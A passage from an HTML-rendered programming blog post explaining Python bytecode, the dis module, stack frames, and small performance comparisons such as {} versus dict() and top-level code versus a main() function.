&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So our dissasembled bytecode will look like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;co_consts   :   (&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;code object add at &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fbce771ec90&lt;/span&gt;, file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ex.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;co_names    :   (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add&amp;#39;&lt;/span&gt;,)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;co_varnames :   ()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;co_code     :   &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\x84\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Z&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x03\x83\x02\x01\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x04&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BYTECODE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;         X &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;code object add at &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fbce771ec90&lt;/span&gt;, file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ex.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            X &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;add&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            X &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; MAKE_FUNCTION            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            X &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; STORE_NAME               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (add)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;         X &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; LOAD_NAME                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (add)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; CALL_FUNCTION           &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            X &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; POP_TOP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            X &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            X &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; RETURN_VALUE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Disassembly of &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;code object add at &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fbce771ec90&lt;/span&gt;, file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ex.py&amp;#34;&lt;/span&gt;, line &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; LOAD_FAST                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (x)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; LOAD_FAST                &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; (y)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; BINARY_ADD
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; RETURN_VALUE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For an easier understanding let&amp;rsquo;s ignore the &amp;lsquo;X&amp;rsquo; marked bytecodes and focus more on the others. So, we firstly push to the evaluation stack 2 consts from the &lt;code&gt;co_consts&lt;/code&gt; list at index 2 and 3 which are our function&amp;rsquo;s arguments &lt;em&gt;(values: 5, 10)&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;After, we call the function, specifying the nr of arguments it has &lt;em&gt;(&lt;code&gt;CALL_FUNCTION 2&lt;/code&gt;)&lt;/em&gt;. At this point, a frame is going to be created for the &lt;code&gt;add&lt;/code&gt; function which will have its own evaluation stack and block stack. Inside the add&amp;rsquo;s evaluation stack the bytecode for our function will be executed. So we load the values at index &lt;em&gt;0&lt;/em&gt; and &lt;em&gt;1&lt;/em&gt; from the &lt;code&gt;co_varnames&lt;/code&gt; list, which are our functions&amp;rsquo; arguments &lt;em&gt;(x, y)&lt;/em&gt;. Then we add them up, return the value and destroy the frame.&lt;/p&gt;
&lt;p&gt;To better understand this process, let&amp;rsquo;s have a look at how these stacks behave and also at how the opcodes are actually defined within the interpreter.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BINARY_ADD&lt;/strong&gt;
load/push onto the stack the + of the two values on the top
written &lt;code&gt;stack[stackp-1] = stack[stackp-1] + stack[stackp]; stackp -= 1&lt;/code&gt;
(turns the two values on the top of the stack into their sum)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LOAD_FAST N&lt;/strong&gt;
load/push onto the stack the value stored in co_varnames[N],
written stackp += 1, stack[stackp] = co_varnames[N]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LOAD_CONST N&lt;/strong&gt;
pushes co_consts[N] onto the stack.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LOAD_NAME N&lt;/strong&gt;
pushes the value associated with co_names[N] onto the stack.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RETURN_VALUE&lt;/strong&gt;
returns with TOS (top of the stack) to the caller of the function.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CALL_FUNCTION argc&lt;/strong&gt;
calls a callable object with positional arguments. &lt;code&gt;argc&lt;/code&gt; indicates the number of positional arguments.
the TOS contains positional arguments, with the right-most argument on top. CALL_FUNCTION pops all arguments
and the callable object off the stack, calls the callable object with those arguments, and pushes the
return value returned by the callable object.&lt;/p&gt;
&lt;p&gt;( check the dis module &lt;a href=&#34;https://docs.python.org/3/library/dis.html#python-bytecode-instructions&#34;&gt;docs&lt;/a&gt; for a complete definition of all the instructions)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BYTECODE								Main Frame						
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--------								----------						&lt;span style=&#34;color:#f92672&#34;&gt;====&lt;/span&gt; is pop
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;																		&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;--&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; is push
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									 evaluation stack
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LOAD_NAME 		&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;add&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;----|		|---------------|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LOAD_CONST 		&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;----|---&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt;	| 10			| &lt;span style=&#34;color:#f92672&#34;&gt;=====&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LOAD_CONST		&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;----|---&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt;	|  5			| &lt;span style=&#34;color:#f92672&#34;&gt;=====&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CALL_FUNCTION	&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; 			 |---&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt;	| &amp;lt;add func&amp;gt; 	| &lt;span style=&#34;color:#f92672&#34;&gt;=====&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									| 15	  &amp;lt;-----|--------|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									|---------------|		 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	|								|  block stack	|		 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	|								|---------------|		 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	|								|	.........	|		 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	|								|---------------|		 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	V														 | returns 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;															 |	 the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LOAD_FAST	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;-------|								 | 	   value
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LOAD_FAST	&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;y&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;---|	|			add Frame			 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BINARY_ADD				|	|			---------			 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RETURN_VALUE			|	|								 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;						|	|		 evaluation stack		 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;						|	|		|---------------|		 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;						|---|----&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt;	| val of y &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;	| &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt;&amp;gt;	 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;							|----&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt;	| val of x &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;	| &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt;&amp;gt;	 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									| 15	  ------|--------|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									| 				|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									|---------------|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									|  block stack	|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									|---------------|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									| 	.........	|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;									|---------------|
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you want to explore more about how the PVM works, how frames are created, what are the C structures behind
the scenes, check out this talk [] and the actual source code []&lt;/p&gt;
&lt;h1 id=&#34;some-fun&#34;&gt;Some fun&lt;/h1&gt;
&lt;h2 id=&#34;dict-vs&#34;&gt;dict() vs&lt;/h2&gt;
&lt;p&gt;There&amp;rsquo;s a lot of debate on the internet about which is the more efficient way to define lists, dictionaries, etc.
From my point of view, I think one should understand that python is not a language created to run fast code
so if you need to develop complex software that runs fast do it in a lower language such as C/C++. However,
for the sake of the argument and to also explore more about how python behaves let&amp;rsquo;s have a look at the bytecode:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; dis&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dis(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; BUILD_MAP                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; RETURN_VALUE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; dis&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dis(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dict()&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; LOAD_NAME                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (dict)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; CALL_FUNCTION            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; RETURN_VALUE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can easily see that the first option is more efficient, since it doesn&amp;rsquo;t call any function, thus it doesn&amp;rsquo;t
need to push another frame onto the call stack.&lt;/p&gt;
&lt;h2 id=&#34;should-we-use-a-main-function-or-not&#34;&gt;Should we use a main function or not?&lt;/h2&gt;
&lt;p&gt;I built 2 simple programs to test this:&lt;/p&gt;
&lt;p&gt;naked.py&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	i
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;main_func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		i
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;main()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Most of us would assume that the second program would take longer to execute, however
if we check the exection time we see this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;main_func.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;________________________________________________________
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Executed in    1.32 secs   fish           external 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   usr time  1312.34 millis  1300.00 micros  1311.04 millis 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   sys time   10.10 millis  159.00 micros    9.94 millis 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;naked.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;________________________________________________________
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Executed in    2.39 secs   fish           external 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   usr time    2.38 secs  365.00 micros    2.38 secs 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   sys time    0.01 secs   45.00 micros    0.01 secs 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So why is that? Well we should explore the bytecode:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; naked &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;naked.py&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.read&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; dis.dis&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;naked&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; LOAD_NAME                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;range&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
